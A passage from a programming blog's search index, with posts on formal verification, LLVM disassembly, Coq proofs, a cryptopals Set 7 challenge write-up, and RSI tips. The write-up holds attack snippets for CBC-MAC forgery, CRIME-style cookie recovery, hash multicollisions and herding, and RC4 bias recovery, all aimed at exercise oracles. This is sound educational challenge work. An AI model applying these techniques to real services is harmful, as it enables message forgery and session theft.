Matt Green sums it up nicely. The two parts of WPA2 ‚Äî the 4-way handshake and the encryption protocol ‚Äî have security proofs; the 4-way handshake was even formally verified in 2005! However, no one reasoned about how these two parts interacted in real-world code, leading to almost every single implementation on the planet being vulnerable to a catastrophic Key Reuse attack that can lead to full decryption and forgery of WiFi traffic. A smaller issue is a recent parsing bug in CompCert, a formally verified C compiler released in 2008. The bug is an amateur scoping issue, where a variable declared in the scope of a for loop clobbers a global variable with the same name. Although the CompCert paper explicitly says that the parsing step, as well as the assembling/linking steps, are not verified, this kind of bug is a huge blow to the credibility of formal methods. It really makes you wonder what sort of bugs formal verification is supposed to catch. Is there hope? Formal verification may not totally be wishful thinking. I‚Äôm hanging onto the hope that there is a place for it, and there‚Äôs some evidence to support this. In the empirical study, no bugs were found in the implementation of complex and error-prone distributed protocols (Paxos, RAFT). This shows that verification can be applied to increase reliability. And John Regehr‚Äôs compiler bug-hunting paper reported that CompCert did not have any runtime wrong-code errors, which were found in 10 other compilers. But the guarantees that we expect are much stronger than a correct protocol, handshake, or compiler optimization. We need the entire system to be reliable, and we need proof effort to be minimal for widespread adoption to be feasible. The bottom line is that formal methods will languish in academic circles, unable to bridge the gap with the real, nonsensical world, for a long time to come.","categories":[{"name":"Formal Methods","slug":"Formal-Methods","permalink":"http://raywang.tech/categories/Formal-Methods/"}],"tags":[{"name":"Coq","slug":"Coq","permalink":"http://raywang.tech/tags/Coq/"}]},{"title":"Using the LLVM MC Disassembly API","slug":"Using-the-LLVM-MC-Disassembly-API","date":"2017-12-04T19:40:26.000Z","updated":"2017-12-04T19:58:09.000Z","comments":true,"path":"2017/12/04/Using-the-LLVM-MC-Disassembly-API/","link":"","permalink":"http://raywang.tech/2017/12/04/Using-the-LLVM-MC-Disassembly-API/","excerpt":"In this post, I‚Äôll walk through how to link an application against LLVM and show a simple usage of the LLVM McDisassembler API. It‚Äôs a little more complex that it seems, probably because there‚Äôs not many good resources for using this API.","text":"In this post, I‚Äôll walk through how to link an application against LLVM and show a simple usage of the LLVM McDisassembler API. It‚Äôs a little more complex that it seems, probably because there‚Äôs not many good resources for using this API. Linking a program with LLVM The handy llvm-config utility, which comes with LLVM, can be used to determine the compiler/linker flags you need for LLVM. The relevant options are --ldflags, --cxxflags, and --libs. Let‚Äôs see what the output of these will be. 1234567891011&gt; llvm-config --ldflags-L/usr/local/lib -lz -lpthread -ldl -lm&gt; llvm-config --cxxflags-I/usr/local/include -D_DEBUG -D_GNU_SOURCE -D__STDC_CONSTANT_MACROS -D__STDC_FORMAT_MACROS -D__STDC_LIMIT_MACROS -O3 -fomit-frame-pointer -fvisibility-inlines-hidden -fno-exceptions -fno-rtti -fPIC -Woverloaded-virtual -Wcast-qual&gt; llvm-config --libs-lLLVMLTO -lLLVMLinker -lLLVMipo -lLLVMVectorize -lLLVMBitWriter -lLLVMTableGen -lLLVMDebugInfo -lLLVMOption -lLLVMX86Disassembler -lLLVMX86AsmParser -lLLVMX86CodeGen -lLLVMSelectionDAG-lLLVMAsmPrinter -lLLVMX86Desc -lLLVMX86Info -lLLVMX86AsmPrinter -lLLVMX86Utils -lLLVMIRReader-lLLVMBitReader -lLLVMAsmParser -lLLVMMCDisassembler -lLLVMMCParser -lLLVMInstrumentation -lLLVMInterpreter -lLLVMMCJIT -lLLVMJIT -lLLVMCodeGen -lLLVMObjCARCOpts -lLLVMScalarOpts-lLLVMInstCombine -lLLVMTransformUtils -lLLVMipa -lLLVMAnalysis -lLLVMRuntimeDyld -lLLVMExecutionEngine -lLLVMTarget -lLLVMMC -lLLVMObject -lLLVMCore -lLLVMSupport If you have a C++ file that includes LLVM headers, first, compile your application to a .o object file with the -c option of g++, which tells it not to run the linker. 1g++ -std=c++11 -I/home/raywang/panda -c -o panda/tools/slice_analyzer.o panda/tools/slice_analyzer.cpp Now, we want to link this .o file against LLVM. The tricky thing is that you can‚Äôt just add llvm-config --ldflags --cxxflags --libs to g++, because the order of these flags matters. When linking libraries, the linker goes from left to right through the libraries, building up a list of missing symbols and resolving symbols as it encounters new libraries. However, it does not search backwards for symbols! So, if you specify a library too early in the command, it will never get used, even when other libraries depend on it! The correct way to link is to first specify the cxxflags and libs, then the ldflags like so: 1g++ panda/tools/slice_analyzer.o -o slice_analyzer `llvm-config --cxxflags --libs` `llvm-config --ldflags` Now, all the missing symbols are filled in by libraries further to the right, so the linker can work correctly! McDisassembly The LLVM MC (Machine Code) library is well-suited to large-scale disassembly applications. Let‚Äôs see the most basic way to use it. We start with a buffer of x86 assembly formatted as a std::string of hex characters: 89e5. We want to disassemble this to the mov ebp, esp instruction. You‚Äôll need to include these header files: 12345678#include \"llvm/MC/MCAsmInfo.h\"#include \"llvm/MC/MCContext.h\"#include \"llvm/MC/MCDisassembler.h\"#include \"llvm/MC/MCInst.h\"#include \"llvm/MC/MCInstPrinter.h\"#include \"llvm/MC/MCInstrInfo.h\"#include \"llvm/MC/MCRegisterInfo.h\"#include \"llvm/MC/MCSubtargetInfo.h\" Now, initialize everything 12345678910111213LLVMInitializeAllAsmPrinters();LLVMInitializeAllTargets();LLVMInitializeAllTargetInfos();LLVMInitializeAllTargetMCs();LLVMInitializeAllDisassemblers();LLVMDisasmContextRef dcr = LLVMCreateDisasm ( \"i386-unknown-linux-gnu\", // TripleName NULL, 0, NULL, NULL); These functions are defined in llvm/lib/MC/MCDisassembler/Disassembler.cpp. We need a handle to a LLVMDisasmContextRef for all future functions, and we can use LLVMCreateDisasm to make one. The first argument to LLVMCreateDisasm is a TripleName, which is formatted like archType-vendor-OS. I think the default vendor is &quot;unknown&quot;. Some valid triples include x86_64-unknown-linux-gnu, i486--linux-gnu, etc. If you want to set Intel syntax, you need to use LLVMSetDisasmOptions(). If you set the correct flag, it will toggle one of three options: 123456/* The option to produce marked up assembly. */#define LLVMDisassembler_Option_UseMarkup 1/* The option to print immediates as hex. */#define LLVMDisassembler_Option_PrintImmHex 2/* The option use the other assembler printer variant */#define LLVMDisassembler_Option_AsmPrinterVariant 4 By default, the asm printer is AT&amp;T syntax, so we need to toggle option flag 4 for Intel: 1LLVMSetDisasmOptions(dcr, 4); Getting disassembly Finally, let‚Äôs disassemble our hex string. For this, we‚Äôll use the LLVMDisasmInstruction function. 123size_t LLVMDisasmInstruction(LLVMDisasmContextRef DC, uint8_t *Bytes, uint64_t BytesSize, uint64_t PC, char *OutString, size_t OutStringSize); This function takes an input buffer of uint8_t, an output buffer of chars, proper lengths, and a program counter PC. Here‚Äôs a routine to convert a std::string to a uint8_t buffer. 12345678910int hex2bytes(std::string hex, unsigned char outBytes[])&#123; // An unsigned char is just an alias for uint8_t // Get raw chars from std::string const char* pos = hex.c_str(); for (int ct = 0; ct &lt; hex.length()/2; ct++)&#123; sscanf(pos, \"%2hhx\", &amp;outBytes[ct]); pos += 2; &#125;&#125; Now, we‚Äôre all set to use LLVMDisasmInstruction! 123456789// targetAsm is a std::string of hex chars// the length of the resulting array of uint8_t's is hex string length/2unsigned char* input = new unsigned char[targetAsm.length()/2];hex2bytes(targetAsm, input);//This is the output buffer for the human-readable instructionchar *outstring = new char[50];LLVMDisasmInstruction(dcr, input, targetAsm.length()/2, 0, outstring, 50);printf(\"%s\", outstring);// Prints mov EBP, ESP To see more usages of the LLVM McDisassembly API, check out the LLVM Project Blog. References https://stackoverflow.com/questions/18267803/how-to-correctly-convert-a-hex-string-to-byte-array-in-c http://blog.llvm.org/2010/01/x86-disassembler.html","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"Panda","slug":"Panda","permalink":"http://raywang.tech/tags/Panda/"},{"name":"LLVM","slug":"LLVM","permalink":"http://raywang.tech/tags/LLVM/"},{"name":"x86","slug":"x86","permalink":"http://raywang.tech/tags/x86/"}]},{"title":"Formal Reasoning in Coq ‚Äî a Beginner's Guide","slug":"formal-reasoning-in-coq","date":"2017-09-25T14:12:00.000Z","updated":"2017-12-27T22:13:24.000Z","comments":true,"path":"2017/09/25/formal-reasoning-in-coq/","link":"","permalink":"http://raywang.tech/2017/09/25/formal-reasoning-in-coq/","excerpt":"I‚Äôm currently taking the Fall 2017 iteration of 6.826, Principles of Computer Systems. This class has been offered in various forms over the years, but this iteration is quite different. It focuses on formal verification of computer systems using Coq, a language for mechanical theorem proving. The goal of this class is to write the spec, implementation, and proofs for a formally verified RAID filesystem in Coq, then generate Haskell code from it.","text":"I‚Äôm currently taking the Fall 2017 iteration of 6.826, Principles of Computer Systems. This class has been offered in various forms over the years, but this iteration is quite different. It focuses on formal verification of computer systems using Coq, a language for mechanical theorem proving. The goal of this class is to write the spec, implementation, and proofs for a formally verified RAID filesystem in Coq, then generate Haskell code from it. I‚Äôve been quite curious about the field of formal verification since I first learned about it last semester. I couldn‚Äôt fit Adam Chlipala‚Äôs FRAP (Formal Reasoning About Programs) into my schedule, but I didn‚Äôt want to miss out on Zeldovich and Kaashoek‚Äôs PoCS class because it seemed more practical in nature. This is the first in a series of posts on approaching Coq and formal verification as a complete beginner. Environment Setup I‚Äôd heard good things about using Emacs + Proof General for Coq, so I started using Spacemacs, which combines vim‚Äôs editing modes and keybindings with Emacs‚Äô. I haven‚Äôt tried the default CoqIDE or Coquille in vim, but Emacs‚Äô Coq support is pretty great. With company-coq and spacemacs-coq layers, there‚Äôs not much more you could ask for. If you‚Äôre coming from vim, Spacemacs is a little obnoxious to get set up, though. The Coq integration is a Spacemacs ‚Äòlayer‚Äô, which is a set of configurations for a specific task. Make sure that the Coq layer activates upon opening a .v file. Perhaps I‚Äôll do another post about all the editors I use daily ‚Äî Vim, Sublime, Atom, and Spacemacs ‚Äî (I‚Äôm a mongrel, I know), but for now, I‚Äôll just direct you to some Spacemacs resources. Tactics, Datatypes, and Coq commands Software Foundations is the best place to start getting your feet wet. The first three chapters ‚Äî Basics, Induction, and Lists ‚Äî will give you all you need to start being productive. When you open a .v Coq file in Spacemacs, Coq mode should be activated. You should now be able to access company-coq commands with the Ctrl-C leader, and if you have spacemacs-coq, there‚Äôs some common commands under the , leader. Start the proof using proof-goto-point or an alias for it, and you‚Äôll be able to see the goal you‚Äôre proving and the context, containing your variables and hypotheses, in a pane on the right. Note that the Coq process can only be active in one buffer at a time, so you can‚Äôt have proofs running simultaneously in several files. Once you‚Äôve learned the basic syntax, you should also do the Emacs company-coq-tutorial to learn about all the IDE-like helpers that the layer provides. Coq objects Here are some of the most important constructs in Coq: Definition, Function, Fixpoint, and Inductive Inductive defines inductive types. Function and Fixpoint are for recursively defined functions on inductive types. Note that Fixpoints must be obviously decreasing on each recursive call, or else Coq will complain. Built-in datatypes such as Nat, List, Prop, Bool. Theorem, Lemma, Proof match statements ( familiar from any other functional language ) Getting started with tactics The first three chapters of SF will teach you a few basic tactics ‚Äî namely, induction, assert, simpl, reflexivity, rewrite, apply, replace. Nearly all the the exercises can be completed with just these. Once you get sufficiently advanced, you‚Äôll be able to identify when magic commands like auto or omega will just solve the rest of your proof for you. info_auto will show you the tactics that auto is using. You‚Äôll start to notice patterns in how to apply tactics. For instance, If you see a recursive data structure, you should think about destruct and induction. Both are used to perform case analysis on a constructor of an inductively defined type; induction also generates an induction hypothesis, while destruct does not. Sometimes, unfold will break a monolithic function into useful pieces. Other times, it will give you a fix expression that is harder to parse. Try simpl instead.2 This cheatsheet is invaluable for most of the tactics you‚Äôll ever need. I also found this site useful for the few most basic tactics. When you first start out, it‚Äôs useful to be able to search for library lemmas, theorems, definitions, notation, etc. The Search ___ command will look for definitions and theorems. If you quote the search string like &quot;eqb&quot;, it will look for all theorems with that as a substring. Locate can look up constants or notation, like &quot;?=&quot;. To insert the outputs of the last command as a comment (so you can refer to it without having to rerun it), spacemacs-coq provides the key sequence , ;. Proving binary search trees (and pitfalls) In the first lab of 6.826, we have to prove properties of trees. We are given a tree, defined as follows: 12345678(* A `nattree` is a tree of natural numbers, where every internal node has an associated number and leaves are empty. There are two constructors, L (empty leaf) and I (internal node). I's arguments are: left-subtree, number, right-subtree. *) Inductive nattree : Set := | L : nattree (* Leaf *) | I : nattree -&gt; nat -&gt; nattree -&gt; nattree. (* Internal nodes *) We have to define a binary search function and a function to test whether a tree is a BST, then write proofs about the correctness of our functions. We want to prove, among other things, that our BST tester does indeed enforce the sortedness of left and right subtrees, and that binsearch can indeed find every element in the tree. My first attempt was a disaster, ending with convoluted proofs that would have gotten progressively harder had I not stopped and asked for help. I‚Äôll talk about some of the pitfalls I made, and then discuss how everything went smoother on the second try. Pitfall 1: The Bool and Prop worlds Coq has two worlds: computational (Type) and logical (Prop). Booleans exist in the computational world, and can be either true or false. Props, by distinction, are uppercased True or False. As this answer explains, Essentially, Coq has both because they are useful for different things: booleans correspond to facts that can be checked mechanically (i.e., with an algorithm), whereas propositions can express more concepts‚Ä¶ If b : bool represents a statement, we can assert that this statement is true by saying b = true, which is of type Prop. Note that Props can be used in proofs, but not in functions. To relate the two, we need theorems that translate between Bool and Prop, as I quickly and painfully discovered. Take a look at my initial definition of binsearch on a nattree t. 1234567891011match t with | L =&gt; false | I l n r =&gt; match beq_nat x n with | true =&gt; true | false =&gt; match Nat.ltb x n with | true =&gt; binsearch x l | false =&gt; binsearch x r end end end end. This seems reasonable, right? However, the beq_nat (an alias for Nat.eqb) and Nat.ltb return Bools, not Props! So, when we want to use hypotheses like x &lt; n (a Prop) to prove (x &lt;? n) = true, it‚Äôs not immediate because they‚Äôre in two different worlds!1 We need a lemma in Coq like 1Lemma ltb_lt n m : (n &lt;? m) = true &lt;-&gt; n &lt; m. This lemma says that the proposition n &lt; m is True iff the proposition (n &lt;? m) = true is True. To illustrate this more, how about proving the proposition that (x &lt;? n) = false given x &gt; n? First we have to do something ugly like 1rewrite &lt;- Bool.not_true_iff_false, Nat.ltb_lt. which changes the goal like: 12345678__________________(x &lt;? n) = false__________________(x &lt;? n) &lt;&gt; true__________________~ x &lt; n and only then will an automagic command like omega be able to solve it. Second attempt What‚Äôs a better way to define binsearch, then? The cleanest is 123456789Function binsearch (x:nat) (t:nattree) : bool :=match t with| L =&gt; false| I l n r =&gt; match x ?= n with | Eq =&gt; true | Lt =&gt; binsearch x l | Gt =&gt; binsearch x r end end. The ?= is Nat.compare, which returns a comparison type, defined below: 1234Inductive comparison : Set := | Eq : comparison | Lt : comparison | Gt : comparison. With this cleaner definition, we can now use the lab‚Äôs given destruct_compare tactic to split our proof into three cases: x &lt; n, x = n, x &gt; n. Pitfall 2: Non-recursive definitions Observe these two definitions of btree_sorted, which checks a tree is a valid BST. 1: 1234567891011Fixpoint isAscendingProp (t: list nat) : Prop := match t with | nil =&gt; True | cons h tl =&gt; match tl with | nil =&gt; True | _ =&gt; and (Nat.le h (hd 0 tl)) (isAscendingProp tl) end end.Function btree_sorted (t:nattree) : Prop := isAscendingProp (flatten t). 2: 12345Function btree_sorted (t:nattree) : Prop := match t with | L =&gt; True | I l n r =&gt; btree_le l n /\\ btree_ge r n /\\ btree_sorted l /\\ btree_sorted r end. 1 is flattening the tree via in-order traversal, then checking that each element in the list is ‚â§\\leq‚â§ the next element. Algorithmically, this is efficient and correct, but it would lead to more work when writing proofs, since I would need more lemmas about isAscendingProp that related non-adjacent elements. Writing recursive definitions as in 2 makes the proof much easier. As my TA said, you want the definition to match how you‚Äôre writing the proof. Aside: Using List lemmas In my final solution, all my functions were recursive except btree_in, for determining membership in a list. 12Function btree_in (x:nat) (t:nattree) : Prop := In x (flatten t). If you get comfortable with the List library, then this shouldn‚Äôt be a problem. The In function has some nice lemmas. I used this one a lot: 1Lemma in_app_or : forall (l m:list) (a:A), In a (l ++ m) -&gt; In a l \\/ In a m. to split up 1H0: In x (flatten t1 ++ n :: flatten t2) into 1H0 : In x (flatten t1) \\/ n = x \\/ In x (flatten t2) Identifying patterns I found myself repeating the same tactic patterns in my proofs. For example, when I have a series of /\\ like A /\\ B /\\ C in my hypotheses, I can split them up using destruct_pairs, allowing me to use each clause individually because I know each one must be true. If there‚Äôs a series of \\/ in a hypothesis, you need to use multiple destructs. For example, I often ended up having H0 : In x (flatten left_subtree) \\/ n = x \\/ In x (flatten right_subtree) in my context, and my goal was to prove one of those clauses. Well, I would use destruct to consider each case individually, showing that the other two non-goal clauses resulted in contradictions. Therefore, my own goal must be true. Conventions and sugar In Basics.v of SF, you‚Äôll find best practices on organizing proofs. I like to use nested bullet points -, +, and *, in that order, to focus subgoals whenever I am doing cases, induction, or destruct. When I have an assert, I wrap the proof of the assert in {}. Hopefully, you learned some pointers to get you more productive in Coq! There‚Äôs not many clear, beginner-oriented resources out there, so all of this post was constructed with trial and a lot of error. Resources Spacemacs Cheatsheet Spacemacs for Vim users 1.&lt;?, btw, is the notation for ltb, which you could have looked up with Locate &quot;&lt;?&quot;. ‚Ü©2.simpl, like many other tactics, can be applied globally in context and goal with ___ in *, or to a specific hypothesis with ___ in H0. ‚Ü©","categories":[{"name":"Formal Methods","slug":"Formal-Methods","permalink":"http://raywang.tech/categories/Formal-Methods/"}],"tags":[{"name":"Coq","slug":"Coq","permalink":"http://raywang.tech/tags/Coq/"}]},{"title":"Matasano Crypto Challenges, Set 7","slug":"matasano-crypto-challenges-set-7","date":"2017-09-11T14:54:00.000Z","updated":"2017-09-29T19:20:02.000Z","comments":true,"path":"2017/09/11/matasano-crypto-challenges-set-7/","link":"","permalink":"http://raywang.tech/2017/09/11/matasano-crypto-challenges-set-7/","excerpt":"Into uncharted waters we venture‚Ä¶ this set has some various problems about famous real-world vulnerabilities, and it was challenging. fortenforge and I worked together quite a bit to get through it.","text":"Into uncharted waters we venture‚Ä¶ this set has some various problems about famous real-world vulnerabilities, and it was challenging. fortenforge and I worked together quite a bit to get through it. One important life pro tip: os.urandom() is BLOCKING in python. That means, even multiprocessing code will not have any speedup because of this function! Try this snippet off StackOverflow instead: bytearray(random.getrandbits(8) for _ in range(num_bytes)) Challenge 49 CBC-MAC Message Forgery This attack emphasizes two things: that CBC-MAC should use a constant IV, and that it is vulnerable to length extension. For the first part, the attacker controls the IV used by CBC-MAC. We want to construct a valid message of the form &quot;from=victim&amp;to=attacker&amp;amount=1000&quot;. First, the attacker generates a valid message and MAC from an account that he controls (say, an accomplice), like &quot;from=normal&amp;to=attacker&amp;amount=1000&quot;. Then, the attacker generates the correct IV to turn normal into victim, as follows: 12345678evil_msg = \"from=victim&amp;to=attacker&amp;amount=1000\"evil_padded = padPKCS7(evil_msg, 16)# We're xoring the forged message and normal_msg to get the difference between the two, and then applying it to the ivforged_iv = xor(evil_msg[:16], normal_msg[:16], iv)forged_mac = CBC_MAC(key, forged_iv, evil_padded)assert forged_mac == mac This forged mac will now be verified by the API server. One thing that confused me is how the attacker would be able to know the private key to communicate with the server, allowing him to construct such a message. This makes sense when the challenge explains: [The API is] publicly exposed - the attacker can submit messages freely assuming he can forge the right MAC. The web client should allow the attacker to generate valid messages for accounts he controls. Assume the attacker is in a position to capture and inspect messages from the client to the API server. The important thing is that the attacker can generate MACs using the private key for accounts that he controls, but not for someone else‚Äôs account. In the second part of this challenge, the attacker uses length extension to append an evil string &quot;attacker:10000&quot; to a recipients list in a victim‚Äôs transaction. The attacker first generates a MAC for a valid message that names him as a recipient (say, a transaction from himself to himself). He then intercepts a normal message like &quot;from=victim&amp;tx_list=normaluser:1&quot;, and xors in his own message at the end, causing the resultant MAC to become his own MAC. 12345678910attacker_valid_msg = construct_message(\"hello\", (\"attacker\", 10000), (\"attacker\", 10000))attacker_padded = padPKCS7(attacker_valid_msg, 16)attacker_mac = CBC_MAC(key, iv, attacker_padded)# XOR out normal_mac to reacquire an IV of 0, then XOR in the first block of the attacker's msgevil_msg = padded + xor(normal_mac, attacker_padded[:16]) + attacker_padded[16:]print \"C-&gt;A-&gt;S: Sending Attacker Message + MAC\"r.sendline(evil_msg)r.sendline(attacker_mac) Challenge 50 Hashing with CBC-MAC This is a simple modification of the length extension of the last challenge. My evil javascript payload is an alert with a comment at the end. 12forge = \"alert('Ayo, the Wu is back!');//\"forge_padded = padPKCS7(forge, 16) and, to ensure I get the same hash as the challenge snippet, 296b8d7cb78a243dda4d0a61d33bbdd1, I need to extend the CBC-MAC of the JS payload with the challenge snippet. I can simply add a block in the middle to xor out the MAC of the payload, ensuring that the rest of the CBC-MAC is identical to the original. 1concat_forge = forge_padded + xor(mac, js_padded[:16]) + js_padded[16:] Challenge 51 Compression Ratio Side-Channel Attacks, Aka, CRIME This has got to be the ugliest code I‚Äôve written in a while, because my initial approach was bad‚Ä¶ In this challenge, we use the side channel of zlib compression to leak a session cookie in an HTTP request. Without knowing much about the internal DEFLATE algorithm of zlib, just realize that repeated strings compress better. So, the basic idea is to bruteforce the session id by seeing whether added characters minimize the compression ‚Äî telling us that the added characters are a part of the session id. I attempt to minimize scores by adding pairs of characters, but that turned out to be unnecessary. I also utilized python‚Äôs multiprocessing library, which was also totally overkill. 12pool = mp.Pool(processes = 8)compression_lens = pool.map(compression_oracle_worker, base64_permutations) When we are using CTR as the compression cipher, it‚Äôs pretty simple, since there‚Äôs no padding involved. Correct guesses for more characters of the id will result in lower compression lengths. When using CBC, we have to be concerned with padding. Instead of simply minimizing the compressed length, I need to use another piece of information to determine when I‚Äôve guessed the right characters ‚Äî a padding oracle. I put in some uncompressible guess for the id and find the padding necessary to push the compressed length above a block boundary. Once I find the correct id characters, then the compressed length will be a block length (16 bytes) lower than the uncompressible guess, because I‚Äôve compressed it below the block boundary. The set of characters !@#$%^&amp;*()-`~[]}{ can be used as padding, because they are not base64 characters and will not appear in the session id. I had to do a few hacky things to get it all to work, though: I need to test two padding lengths for each guess, since my guesses are all possible pairs of base64 characters. And, python‚Äôs Pool.map doesn‚Äôt take multiple arguments, so I have to pass in a list of lists to my oracle worker. 12base64_perms = [[padding[:-1], final + \"\".join(perm)] for perm in it.permutations(base64_chars, 2)]base64_perms += [[padding[:-2], final + \"\".join(perm)] for perm in it.permutations(base64_chars, 2)] Challenge 52 Iterated Hash Function Multicollisions The next three challenges all involve attacks on the Merkle-Damgard hash construction. We encountered this previously with MD5 and SHA1, and we‚Äôll be using a specifically weakened version in these challenges. The basic idea in this challenge is that, once we find an initial collision of an iterated hash function, we can generate a ton more by extending that initial collision. The relevant paper is Joux. The key figure is ![Multicollision Construction Joux](/images/2017/09/Screenshot 2017-09-11 12.48.58.png). We can see that we can construct colliding messages by selecting one of BiB_iBi‚Äã, Bi‚Ä≤B_i&#x27;Bi‚Ä≤‚Äã for each iii, giving us a total of 2i2^i2i colliding messages. Each message has the same intermediate hash values, h0,h1...h_0, h_1...h0‚Äã,h1‚Äã.... Now that we have a cheap way to generate collisions (if we ever need more, we can double how many collisions we have with very little work), we can break a cascaded hash function that just concatenates a weak hash and a strong hash. In my code, my ‚Äúweak‚Äù hash is a Blowfish cipher truncated to 2 bytes of output, and my ‚Äústrong‚Äù hash is truncated to 3 bytes of output. We can simply search in our pool of weak hash collisions for a pair of messages that also collides in the strong hash. No luck? Then double the number of weak hash collisions (easy!) and keep looking‚Ä¶ Challenge 53 Kelsey and Schneier‚Äôs Expandable Messages It took me a little bit to understand this attack. The best explanation is Schneier‚Äôs paper here.. The goal here is to break second preimage resistance ‚Äî as the challenge states, finding x‚Ä≤x&#x27;x‚Ä≤ such that H(x‚Ä≤)=H(x)=yH(x&#x27;) = H(x) = yH(x‚Ä≤)=H(x)=y. Remember that, in the iterated hash function construction, if the internal hash state of two different messages are ever equal, then we can make sure that all following hash states, including the output, will be equal (by ensuring that the messages don‚Äôt differ after this point). So, if we have a very long message of 2R‚àí12^R - 12R‚àí1 blocks, we have 2R2^R2R intermediate hash states that we can potentially collide with, decreasing the difficulty of finding a second preimage. However, length padding screws this up. MD construction calls for the length of the message to be appended to the message before the final hash is output, which prevents the above attack. We are forced to find a colliding message of length 2R‚àí12^R - 12R‚àí1! Fortunately, we can bypass this defense with expandable messages that allow us to actually construct a message of this length very easily. We first find pairs of colliding messages, where each pair consists of a single-block message and a message of length 2k‚àí1+12^{k-1} + 12k‚àí1+1. Each pair‚Äôs initial hash state is the colliding hash of the previous pair. This is our expandable message. ![Expandable message](/images/2017/09/expandable message diagrams.png) When we want to construct a message of length between kkk and k+2k‚àí1k + 2^k - 1k+2k‚àí1, we can create it by concatenating pieces of our expandable message (you might already be able to see how if you are familiar with binary search). For each block in our chain, we can either append the single-block message or the 2i‚àí12^{i} - 12i‚àí1 message, allowing us to build a message of any length that hashes to the same output as the others. The result will look something like this: So, all that remains to get our second preimage is to find a single ‚Äúbridge‚Äù block that will allow our expandable message to hash to one of the intermediate states of the long message. Once we find this block, which collides with the nnnth intermediate hash state of the long message, we simply produce a message of length nnn in the manner shown above. 12345# Where prefix is generated from our expandable messageprefix = generate_prefix(intmed_state_hash_index)second_preimage = prefix + linking_blocksecond_preimage += target_long_msg[len(second_preimage):] Challenge 54 Kelsey and Kohno‚Äôs Nostradamus Attack This challenge deals with another kind of preimage resistance ‚Äî we want to make a prediction about some event that hashes to some output HHH, and after the event has passed, create a correct ‚Äúprediction‚Äù that also hashes to HHH, thus convincing people that we knew the results of the event beforehand. This attack is also known as the ‚Äúherding‚Äù attack, and it‚Äôs easy to see why. The basic premise is to construct a ‚Äúcollision tree‚Äù by selecting a bunch of starting hash states, finding message blocks under which pairs of these states collide, and building up a binary tree to a root hash state. The paper calls this tree a ‚Äúdiamond structure‚Äù, and it‚Äôs very easy to produce. ![](/images/2017/09/Screenshot 2017-09-11 17.50.41.png) Once we have the collision tree, we can choose our prefix (the actual result of the event) and append some glue blocks so that the last one collides with one of the leaves in our tree. Then, as the challenge says ‚ÄúFollow the path from the leaf all the way up to the root node and build your suffix using the message blocks along the way.‚Äù Challenge 55 MD4 Collisions To be honest, this challenge makes everything else look like chump stuff. fortenforge and I worked on this together for several days, and when I got tired of it, he soldiered on, ending up with a beautiful MD4 collision. I‚Äôll refer you to his writeup in lieu of explaining it myself, and he deserves all the credit for this excellent piece of work. Challenge 56 RC4 Single Byte biases This seems like a pretty silly challenge, and I couldn‚Äôt get it to work. We basically trust this paper that says that the RC4 encryption function is biased towards certain bytes at certain byte positions ‚Äî byte 0, 16, 32, etc. For instance, the RC4 ciphertext‚Äôs 16th byte is biased towards 0xF0. To quote the paper, Suppose byte ZrZ_rZr‚Äã of the RC4 keystream has a dominant bias towards value 0x00. As RC4 encryption is defined as Cr=Pr‚äïZrC_r = P_r ‚äï Z_rCr‚Äã=Pr‚Äã‚äïZr‚Äã, the corresponding ciphertext byte CrC_rCr‚Äã has a bias towards plaintext byte PrP_rPr‚Äã. Thus, obtaining sufficiently many ciphertext samples CrC_rCr‚Äã for a fixed plaintext PrP_rPr‚Äã allows inference of PrP_rPr‚Äã by a majority vote: PrP_rPr‚Äã is equal to the value of CrC_rCr‚Äã that occurs most often. Unfortunately, you need to RC4 encrypt a ton of messages under random keys for this to work, which takes a lot of time, and the results were not at all good for me, even with 2242^{24}224 encryptions for each byte. 12345678910111213def attack_byte(idx): chars = &#123;char: 0 for char in range(256)&#125; padding = 'A'*(15 - idx) for i in range(2**20): if i % (10**6) == 0: print(\"Iteration: \", i) ctext = rc4_oracle(padding) guess = ctext[15] ^ 0xf0 chars[guess]+= 1 max_char = max(chars.items(), key = op.itemgetter(1))","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Protips for Speed (And Reducing RSI) for Programmers or Mac Users","slug":"Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users","date":"2017-08-13T23:23:45.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/08/13/Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users/","link":"","permalink":"http://raywang.tech/2017/08/13/Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users/","excerpt":"I‚Äôve been wanting to write this post for a while ‚Äî here I‚Äôll describe all the excellent customizations that I‚Äôve accrued over several years of optimizing my Mac for speed and alleviating repetitive stress injury (RSI). If you‚Äôre a Mac power user, or if you make a living at a keyboard, you want to read this.","text":"I‚Äôve been wanting to write this post for a while ‚Äî here I‚Äôll describe all the excellent customizations that I‚Äôve accrued over several years of optimizing my Mac for speed and alleviating repetitive stress injury (RSI). If you‚Äôre a Mac power user, or if you make a living at a keyboard, you want to read this. Preventing or reducing RSI If you‚Äôve never experienced RSI, I‚Äôm jealous. Programming for just a few years has given me mild to excruciating amounts of wrist pain, finger pain, and elbow pain, and I‚Äôm still just a student! The small investment in an ergonomic setup could save you a lot of trouble later. Here are some things that help: Gel wrist rest My first ergonomic venture was a 3M gel wrist rest off of Amazon. It‚Äôs lasted two years so far and has been great to keep the sharp edge of my Macbook from digging into my wrists. It also elevates your hands above the keyboard so that typing is more comfortable. I‚Äôm now inseparable from my wrist rest, and it‚Äôs also gotten me some extra screening from airport security‚Ä¶ Compression gloves If you have finger joint soreness, compression gloves are a must. I‚Äôve tried many different pairs (comparing price and compression level), and I think IMAK has pretty good ones. They‚Äôre quite delicate and can tear after extended use, but they provide much better compression and fit than cheaper, thicker gloves. Even if you don‚Äôt have any pain, I recommend getting a pair. They make typing much more pleasurable, especially in cold weather. Ergonomic mouse and trackpad I also tried a few ergo mice before settling on the J-Tech mouse. It has both Bluetooth and wired versions, and it works great on a Mac. You can see in the photo the wonderful detachable platform on which you rest the bottom of your palm, keeping it off the table. There‚Äôs also two thumb-side buttons that you can customize, as I‚Äôll mention later. Much less finger pain than using a trackpad or a conventional mouse. Get a trackpad with a wrist rest (either foam or gel, your pick), while you‚Äôre at it. Standing desk A full standing desk is definitely too pricey, but there are cheaper solutions out there. One that serves its purpose for only $35 is this guy. It‚Äôs good to alternate standing and sitting, and this portable one is light as air and easy to set aside, but still sturdy. 